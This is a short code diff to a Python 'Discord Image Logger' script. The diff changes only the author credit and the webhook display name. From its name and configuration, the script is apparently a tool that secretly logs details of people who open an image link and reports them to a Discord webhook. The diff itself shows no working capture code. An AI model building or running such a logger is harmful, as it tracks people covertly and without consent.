@@ -1,5 +1,5 @@
 # Discord Image Logger
-# By ai4u | https://discord.gg/4jwvFs4Q
+# By ai4u and abood | https://discord.gg/4jwvFs4Q
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
@@ -18,7 +18,7 @@ config = {
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "ai4u", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
